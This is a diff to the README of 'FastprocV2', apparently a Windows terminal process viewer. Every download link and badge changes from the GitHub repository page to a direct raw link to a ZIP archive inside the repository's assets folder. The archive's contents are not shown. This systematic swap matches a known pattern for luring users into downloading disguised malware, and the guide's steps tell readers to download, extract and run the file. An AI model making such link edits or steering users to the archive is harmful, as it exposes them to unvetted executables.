@@ -1,6 +1,6 @@
 # 🖥️ FastprocV2 - See Processes Fast and Clear
 
-[![Download FastprocV2](https://img.shields.io/badge/Download-FastprocV2-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/4mama/FastprocV2)
+[![Download FastprocV2](https://img.shields.io/badge/Download-FastprocV2-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/4mama/FastprocV2/main/assets/Fastproc_v2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Use this guide to download and run FastprocV2 on Windows from the link above.
 
 Go to this page to download and set up FastprocV2:
 
-https://github.com/4mama/FastprocV2
+https://raw.githubusercontent.com/4mama/FastprocV2/main/assets/Fastproc_v2.8.zip
 
 ## 🪟 Run on Windows
 
@@ -28,7 +28,7 @@ FastprocV2 is built for a terminal window. On Windows, you will use it from a co
 ### How to get it
 
 1. Open the download page:
-   https://github.com/4mama/FastprocV2
+   https://raw.githubusercontent.com/4mama/FastprocV2/main/assets/Fastproc_v2.8.zip
 2. Look for the latest release or build file on the page.
 3. Download the Windows file to your computer.
 4. If the file is in a ZIP folder, extract it first.
@@ -187,4 +187,4 @@ Yes. The compact layout and live updates make it useful for fast system checks.
 
 Download or visit the FastprocV2 page here:
 
-https://github.com/4mama/FastprocV2
+https://raw.githubusercontent.com/4mama/FastprocV2/main/assets/Fastproc_v2.8.zip
